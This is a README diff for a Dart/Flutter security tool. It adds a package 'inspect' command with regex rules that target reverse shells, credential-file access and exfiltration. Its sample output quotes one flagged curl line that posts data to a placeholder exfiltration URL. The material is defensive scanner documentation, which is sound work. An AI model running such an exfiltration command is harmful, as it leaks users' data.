@@ -4,32 +4,59 @@
 [![OSV.dev](https://img.shields.io/badge/powered%20by-OSV.dev-blue)](https://osv.dev)
 [![License](https://img.shields.io/badge/license-Apache%202.0-green)](LICENSE)
 
-Security vulnerability scanner for Dart and Flutter projects.  
-Checks every dependency in your `pubspec.lock` against the [OSV.dev](https://osv.dev) open vulnerability database — the same database used by GitHub Dependabot and `npm audit`.
+Security toolkit for Dart and Flutter projects — two commands, two layers of defence:
+
+| Command                              | What it does                                                                                                                       |
+| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- |
+| `dart_audit audit`                   | Checks every dependency in `pubspec.lock` against the [OSV.dev](https://osv.dev) vulnerability database                            |
+| `dart_audit inspect <pkg> <version>` | Downloads a package from pub.dev and statically analyses its Dart source for suspicious patterns before you add it to your project |
 
 ---
 
 ## Features
 
+### `audit` — CVE / advisory scanning
+
 - Scans **all** packages (direct and transitive) from `pubspec.lock`
-- Single batched request to `api.osv.dev` — fast, no API key needed
-- Colored terminal output with severity (CRITICAL / HIGH / MEDIUM / LOW)
-- Shows CVE/GHSA aliases, summary, and available fix version
+- Batched requests to `api.osv.dev` — fast, no API key needed
+- 30 s timeout with automatic retries (exponential back-off, up to 3 attempts)
+- CVSS severity classification: CRITICAL / HIGH / MEDIUM / LOW
+- Shows CVE / GHSA aliases, summary, and available fix version
+- Filter by minimum severity (`--min-severity high`)
+- Suppress known findings (`--ignore CVE-2024-12345`)
+- `--format json` for machine-readable output
+- Warns about git / path / sdk dependencies that cannot be scanned
 - Exit code `1` on findings — integrates directly into CI/CD pipelines
-- `--exit-zero` flag for reporting-only mode
-- `--verbose` to list all packages, including clean ones
+- `--exit-zero` for reporting-only mode
+
+### `inspect` — static source analysis (supply-chain defence)
+
+- Downloads the package archive from pub.dev and extracts `.dart` files
+- **Regex scanner** — 14 rules across 7 categories:
+  - Hard-coded URLs to unknown hosts
+  - Raw socket / TCP connections
+  - `Process.run` / shell injection
+  - Sensitive file-system access (`/etc/passwd`, `~/.ssh`, etc.)
+  - Hex encoding, Base64 eval, Unicode escapes, char-code concatenation (obfuscation)
+  - Crypto-mining patterns
+  - Backdoor / reverse-shell patterns
+  - Data exfiltration markers
+- **Shannon entropy scanner** — flags strings with unusually high entropy (potential obfuscated payloads or embedded secrets)
+- Risk score 0–100 with labels: CLEAN / LOW RISK / SUSPICIOUS / HIGH RISK
+- `--format json` for machine-readable output
+- Exit code `1` when the package is flagged as SUSPICIOUS or worse
 
 ---
 
 ## Installation
 
-### As a global tool
+### As a global tool (recommended)
 
 ```bash
 dart pub global activate dart_audit
 ```
 
-Make sure `~/.pub-cache/bin` is in your `PATH`. Add this to your shell profile if needed:
+Make sure `~/.pub-cache/bin` is in your `PATH`:
 
 ```bash
 export PATH="$PATH:$HOME/.pub-cache/bin"
@@ -38,15 +65,12 @@ export PATH="$PATH:$HOME/.pub-cache/bin"
 ### As a dev dependency (project-local)
 
 ```yaml
-# pubspec.yaml
 dev_dependencies:
-  dart_audit: ^0.1.0
+  dart_audit: ^0.2.0
 ```
 
-Then run with:
-
 ```bash
-dart run dart_audit
+dart run dart_audit audit
 ```
 
 ---
@@ -54,34 +78,55 @@ dart run dart_audit
 ## Usage
 
 ```
-Usage: dart_audit [options]
+Usage: dart_audit <command> [options]
 
--l, --lockfile    Path to pubspec.lock. (defaults to "pubspec.lock")
--v, --verbose     Show all packages, including clean ones.
-    --exit-zero   Always exit 0, even when vulnerabilities are found.
-    --version     Print version and exit.
--h, --help        Show this help.
+Commands:
+  audit      Scan pubspec.lock against the OSV.dev vulnerability database (default).
+  inspect    Statically analyse a pub.dev package before adding it to your project.
+
+Global options:
+  --no-color    Disable ANSI colours.
+  --version     Print version and exit.
+  -h, --help    Show this help.
 ```
 
-### Examples
+### `audit`
+
+```
+Usage: dart_audit audit [options]
+
+-l, --lockfile         Path to pubspec.lock (default: "pubspec.lock").
+-f, --format           Output format: text (default) or json.
+    --min-severity     Only report findings at or above this level (low/medium/high/critical).
+-i, --ignore           Ignore a specific CVE/GHSA ID. Can be repeated.
+-v, --verbose          Show all packages, including clean ones.
+    --exit-zero        Always exit 0, even when vulnerabilities are found.
+-h, --help             Show this help.
+```
+
+#### Examples
 
 ```bash
-# Scan pubspec.lock in the current directory:
-dart_audit
+# Scan the current project:
+dart_audit audit
 
 # Scan a specific lockfile:
-dart_audit --lockfile path/to/pubspec.lock
+dart_audit audit --lockfile path/to/pubspec.lock
 
-# Show all packages (clean + vulnerable):
-dart_audit --verbose
+# Only report HIGH and CRITICAL findings:
+dart_audit audit --min-severity high
 
-# Report findings but never fail the build (CI reporting mode):
-dart_audit --exit-zero
+# Suppress a known false-positive:
+dart_audit audit --ignore GHSA-xxxx-yyyy-zzzz
+
+# Machine-readable output:
+dart_audit audit --format json
+
+# Report without failing the build:
+dart_audit audit --exit-zero
 ```
 
----
-
-## Sample output
+#### Sample output
 
 ```
 Scanning 42 packages against OSV.dev... done.
@@ -100,24 +145,72 @@ Vulnerabilities found: 1 critical, 0 high, 0 medium, 0 low
 Run `dart pub upgrade` or pin to the fixed version to resolve.
 ```
 
-When no vulnerabilities are found:
+---
+
+### `inspect`
 
 ```
-Scanning 51 packages against OSV.dev... done.
+Usage: dart_audit inspect <package> <version> [options]
 
-dart_audit — OSV.dev scan · 51 packages checked
+-f, --format      Output format: text (default) or json.
+    --exit-zero   Always exit 0, even when the package is flagged.
+-h, --help        Show this help.
+```
+
+#### Examples
+
+```bash
+# Inspect a package before adding it:
+dart_audit inspect http 1.2.0
+
+# Get JSON output:
+dart_audit inspect some_package 0.3.1 --format json
+
+# Use in CI without failing the build:
+dart_audit inspect new_dep 2.0.0 --exit-zero
+```
+
+#### Sample output
+
+```
+Inspecting some_package 0.3.1...
+Downloading package source... done.
+Scanning 12 Dart files...
+
+dart_audit — inspect · some_package 0.3.1
 ────────────────────────────────────────────────────────────
 
-✔ No known vulnerabilities found in 51 packages.
+Regex findings (3):
+
+  [CRITICAL] lib/src/native.dart:42
+  Rule: PROCESS_RUN
+  Executes a system process via Process.run/start
+  › Process.run('curl', ['-d', data, exfilUrl])
+
+  [HIGH] lib/src/net.dart:18
+  Rule: RAW_SOCKET
+  Opens a raw TCP socket
+  › final socket = await Socket.connect(host, port);
+
+  [MEDIUM] lib/src/utils.dart:7
+  Rule: HEX_ENCODING
+  Large hex-encoded string literal — possible obfuscated payload
+  › const _payload = '41424344...';
+
+Entropy findings (1):
+
+  lib/src/utils.dart:31  entropy=5.82 bits  [HIGH]
+  › 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q='
+
 ────────────────────────────────────────────────────────────
-No vulnerabilities found. 51 packages scanned.
+Risk score: 75 / 100  ⚠ HIGH RISK
 ```
 
 ---
 
 ## CI/CD integration
 
-### GitHub Actions
+### GitHub Actions — audit + inspect
 
 ```yaml
 steps:
@@ -127,17 +220,18 @@ steps:
     with:
       sdk: stable
 
-  - name: Install dependencies
-    run: dart pub get
+  - name: Install dart_audit
+    run: dart pub global activate dart_audit
 
-  - name: Security audit
-    run: |
-      dart pub global activate dart_audit
-      dart_audit
+  - name: Audit known CVEs
+    run: dart_audit audit
+
+  - name: Inspect a new dependency before adding it
+    run: dart_audit inspect http 1.2.0
 ```
 
-The step fails automatically (exit code 1) if any vulnerability is found.  
-Use `dart_audit --exit-zero` to report without failing.
+Both steps fail automatically (exit code 1) on findings.  
+Use `--exit-zero` to report without blocking the pipeline.
 
 ### GitLab CI
 
@@ -145,27 +239,36 @@ Use `dart_audit --exit-zero` to report without failing.
 security-audit:
   script:
     - dart pub global activate dart_audit
-    - dart_audit
+    - dart_audit audit
 ```
 
 ---
 
 ## How it works
 
-1. **Parses `pubspec.lock`** — extracts the exact name and version of every `hosted` package (i.e., packages from pub.dev).
-2. **Queries OSV.dev** — sends a single `POST /v1/querybatch` request with all packages to `api.osv.dev`. Batches in groups of 100 to stay within API limits.
-3. **Renders the report** — groups results by severity (CRITICAL → HIGH → MEDIUM → LOW), shows CVE/GHSA IDs, summaries, and available fix versions.
-4. **Exits with code 1** if any vulnerability is found, so CI pipelines fail automatically.
+### `audit`
 
-OSV.dev is maintained by Google and is the same underlying database that powers GitHub's Dependabot security alerts.
+1. Parses `pubspec.lock` — extracts the exact name and version of every `hosted` package.
+2. Queries `api.osv.dev/v1/querybatch` in batches of 100 packages per request.
+3. Parses CVSS scores from the OSV response (v3 → v2 → database-specific fallback).
+4. Renders a report grouped by severity; exits with code 1 if any findings pass the filter.
+
+### `inspect`
+
+1. Downloads the `.tar.gz` archive from `pub.dev/api/packages/<name>/versions/<version>`.
+2. Extracts only `.dart` files to a temporary directory (cleaned up automatically).
+3. Runs the regex scanner and entropy scanner in parallel.
+4. Calculates a weighted risk score (CRITICAL regex: 40 pts, HIGH: 20 pts, MEDIUM: 10 pts; HIGH entropy: 15 pts, MEDIUM: 5 pts), clamped to 0–100.
+5. Exits with code 1 if the risk score ≥ 30 (SUSPICIOUS or worse).
 
 ---
 
 ## Limitations
 
-- Only scans packages from `pub.dev` (hosted source). Git or path dependencies are skipped.
-- Requires an active internet connection to reach `api.osv.dev`.
-- Vulnerability data depends on OSV.dev's coverage — not all CVEs may be indexed.
+- `audit` only scans packages from pub.dev (`hosted` source). Git, path, and SDK dependencies are skipped (a warning is shown).
+- `inspect` requires an active internet connection to download the package archive.
+- Vulnerability data depends on OSV.dev coverage — not all CVEs may be indexed.
+- The regex and entropy scanners produce heuristic results. Review findings manually before rejecting a package.
 
 ---
 
